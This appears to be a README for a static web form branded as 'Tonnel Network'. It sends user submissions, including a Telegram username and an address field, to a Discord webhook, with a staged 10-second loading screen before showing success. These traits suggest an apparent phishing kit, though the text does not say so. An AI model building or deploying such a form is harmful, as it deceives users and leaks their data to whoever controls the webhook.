Tonnel Network static form

Files:
index.html
styles.css
app.js
config.js

Setup:
1. Open config.js
2. Paste your Discord webhook URL into discordWebhookUrl
3. Upload all files to the site root

Notes:
- All files are in the root, no folders.
- The form supports English, Russian, Ukrainian, and Chinese.
- After submit, the page shows a 10 second loading animation, then a success state.
- The success text shows the Telegram username entered by the user.

Field change:
- The first name field was replaced with an address field.
